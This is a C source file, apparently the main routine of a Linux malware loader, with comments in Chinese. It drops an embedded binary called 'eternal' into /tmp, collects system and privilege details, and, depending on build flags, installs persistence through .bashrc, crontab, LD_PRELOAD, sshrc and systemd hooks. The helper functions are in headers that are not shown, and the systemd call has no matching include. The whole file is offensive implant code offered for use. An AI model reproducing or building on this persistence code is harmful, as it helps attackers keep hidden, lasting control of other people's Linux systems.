#include <stdio.h>
#include <stdlib.h>
#include <string.h>  // 包含 strcmp 函数所需的头文件
#include "release.h"
#include "bind_files.h"  // 确保这个头文件包含了正确的声明
#include "info.h"

#ifdef BASHRC_MOD
#include "linux_persistence_bashrc.h"
#endif

#ifdef CRONTAB_MOD
#include "linux_persistence_crontab.h"
#endif

#ifdef LD_PRELOAD_MOD
#include "linux_persistence_ld_preload.h"
#endif

#ifdef SSHRC_MOD
#include "linux_persistence_sshrc.h"
#endif

int main() {
    printf("释放嵌入的文件...\n");
    release_file("/tmp/eternal", eternal, eternal_size);  // 确保这些变量已在 bind_files.h 中声明
    printf("完成。\n");

    const char* os = get_operating_system();
    const char* privilege = get_user_privilege();

    printf("检测到系统信息...\n");
    printf("CPU架构: %s\n", get_cpu_architecture());
    printf("操作系统: %s\n", os);
    printf("用户权限: %s\n", privilege);

#ifdef BASHRC_MOD
    if (strcmp(os, "linux") == 0) {
        setup_bashrc_persistence();
    } else {
        printf("不支持的操作系统。\n");
    }
#endif

#ifdef CRONTAB_MOD
    if (strcmp(os, "linux") == 0) {
        setup_crontab_persistence();
    } else {
        printf("不支持的操作系统。\n");
    }
#endif

#ifdef LD_PRELOAD_MOD
    if (strcmp(os, "linux") == 0) {
        setup_ld_preload_persistence();
    } else {
        printf("不支持的操作系统。\n");
    }
#endif

#ifdef SSHRC_MOD
    if (strcmp(os, "linux") == 0) {
        setup_user_sshrc_persistence();
    } else {
        printf("不支持的操作系统。\n");
    }
#endif

#ifdef SYSTEMD_MOD
    if (strcmp(os, "linux") == 0) {
        setup_systemd_persistence();
    } else {
        printf("不支持的操作系统。\n");
    }
#endif

    return 0;
}
